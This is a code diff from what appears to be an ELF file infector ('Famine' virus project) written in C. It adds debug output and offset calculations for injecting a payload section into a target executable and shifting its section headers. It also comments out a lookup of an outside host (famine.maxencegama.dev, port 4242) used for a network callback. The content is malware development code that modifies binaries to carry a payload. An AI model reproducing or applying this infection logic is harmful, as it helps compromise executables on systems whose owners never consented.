@@ -40,18 +40,18 @@ extern uint64_t CDECL_NORM(payload_size);
 // int CDECL_NORM(payload)(void);
 
 int main(int ac, char **av) {
-	struct hostent *hostent = gethostbyname("famine.maxencegama.dev");
-	if (hostent == NULL) {
-		if (errno == 1)
-			printf("Host not found\n");
-		else
-			perror("gethostbyname");
-		return (1);
-	}
+	// struct hostent *hostent = gethostbyname("famine.maxencegama.dev");
+	// if (hostent == NULL) {
+	// 	if (errno == 1)
+	// 		printf("Host not found\n");
+	// 	else
+	// 		perror("gethostbyname");
+	// 	return (1);
+	// }
 
-	uint16_t port = htons(4242);
-	uint32_t addr_ip = *(uint32_t *)hostent->h_addr_list[0];
-	printf("port: %#x %#x (%s)\n", port, addr_ip, inet_ntoa(*(struct in_addr *)&addr_ip));
+	// uint16_t port = htons(4242);
+	// uint32_t addr_ip = *(uint32_t *)hostent->h_addr_list[0];
+	// printf("port: %#x %#x (%s)\n", port, addr_ip, inet_ntoa(*(struct in_addr *)&addr_ip));
 
 	// errno = CDECL_NORM(payload)();
 	// errno = -errno;
@@ -142,6 +142,24 @@ int main(int ac, char **av) {
 	printf("new_section_offset: %#lx\n", new_section_offset);
 	printf("new_section_addr: %#lx\n", new_section_addr);
 
+	printf("p_memsz: %#ld, p_filesz: %ld\n", last_loadable_phdr->p_memsz, last_loadable_phdr->p_filesz);
+	Elf64_Off move_section_off = new_section_offset - (last_section_in_segment + 1)->sh_offset;
+	// Elf64_Addr move_section_addr = new_section_addr - last_loadable_phdr->p_memsz;
+
+	printf("\nmove_section_off: %#lx, %#lx, %#lx\n", move_section_off, new_section_offset + payload_size_p, new_section_offset + payload_size_p + move_section_off);
+
+	// printf("move_section_addr: %#lx\n", move_section_addr);
+
+	// uint64_t size_diff = filesize + payload_size_p + move_section_off;
+	// printf("oldsize: %ld, filesize: %ld\n", new_filesize, size_diff);
+	// if (ftruncate(fd, size_diff) == -1) {
+	//     perror("ftruncate");
+	//     close(fd);
+	//     exit(EXIT_FAILURE);
+	// }
+
+	// map = (uint8_t *)syscall(SYS_mremap, map, new_filesize, size_diff, 1, NULL); // mremap ; flags MREMAP_MAYMOVE = 1
+
 	// leave space for the new section data and copy the payload
 	memmove(map + new_section_offset + payload_size_p, map + new_section_offset, filesize - new_section_offset);
 
@@ -152,6 +170,8 @@ int main(int ac, char **av) {
 	// Copy the payload data
 	printf("payload_size_p: %#lx => %#lx\n", new_section_offset, new_section_offset + payload_size_p);
 	memcpy(map + new_section_offset, payload_p, payload_size_p);
+
+	printf("new section data addr: %#lx\nnext addr available: %#lx\n", new_section_offset, new_section_offset + payload_size_p);
 
 	/**
 	 * 
@@ -182,7 +202,9 @@ int main(int ac, char **av) {
 	shdrs = (Elf64_Shdr *)((char *)map + ehdr->e_shoff);
 
 	for (int i = last_section_in_segment_index; i < ehdr->e_shnum; ++i) {
-		shdrs[i].sh_offset += payload_size_p;
+		printf("==========================\n");
+		printf("old shdrs[%d].sh_offset: %#lx\n", i, shdrs[i].sh_offset);
+		shdrs[i].sh_offset += payload_size_p + move_section_off;
 		if (shdrs[i].sh_addr != 0) {
 			shdrs[i].sh_addr += payload_size_p;
 		}
